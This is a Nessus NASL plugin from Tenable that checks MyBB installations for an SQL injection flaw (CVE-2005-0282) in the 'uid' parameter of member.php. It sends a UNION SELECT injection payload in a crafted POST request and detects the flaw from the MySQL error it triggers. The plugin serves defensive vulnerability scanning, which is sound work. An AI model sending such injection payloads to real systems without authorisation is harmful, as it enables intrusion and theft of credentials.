#
# (C) Tenable Network Security
#


if (description) {
  script_id(16143);
  script_version ("$Revision: 1.8 $");

  script_cve_id("CVE-2005-0282");
  script_bugtraq_id(12161);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"12798");
  }

  name["english"] = "MyBB member.php SQL Injection Vulnerability";
  script_name(english:name["english"]);

  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to SQL
injection attacks. 

Description :

The remote version of MyBB fails to sanitize user-supplied input to
the avatar upload system via the 'uid' parameter of the 'member.php'
script.  If PHP's 'magic_quotes_gpc' setting is disabled, an attacker
may be able to leverage this issue to uncover password hashes and
thereby gain access to the application's admin panel. 

See also : 

http://marc.theaimsgroup.com/?l=bugtraq&m=110486566600980&w=2

Solution : 

Either enable PHP's 'magic_quotes_gpc' setting or upgrade to MyBB
Preview Release 2 or later. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for SQL injection vulnerability in MyBB's member.php script";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 
  family["english"] = "CGI abuses";
  family["francais"] = "Abus de CGI";
  script_family(english:family["english"], francais:family["francais"]);

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/member.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it's from MyBulletinBoard...
  if (egrep(string:res, pattern:"Powered by <a href=.*www\.mybboard\.com.*MyBulletinBoard</a>")) {
    # Try to exploit one of the flaws.
    #
    # nb: use an randomly-named table so we can generate a MySQL error.
    rnd_table = string("nessus", rand_str(length:3));
    postdata = string(
      "uid=1'%20UNION%20SELECT%2010000,200,1%20AS%20type%20FROM%20", rnd_table, "%20WHERE%20uid=1%20ORDER%20BY%20uid%20DESC/*"
    );
    req = string(
      "POST ", dir, "/member.php?action=avatar HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our table name.
    if (egrep(string:res, pattern:string("mySQL error: 1146<br>Table '.*\\.", rnd_table))) {
      security_warning(port);
      exit(0);
    }
  }
}
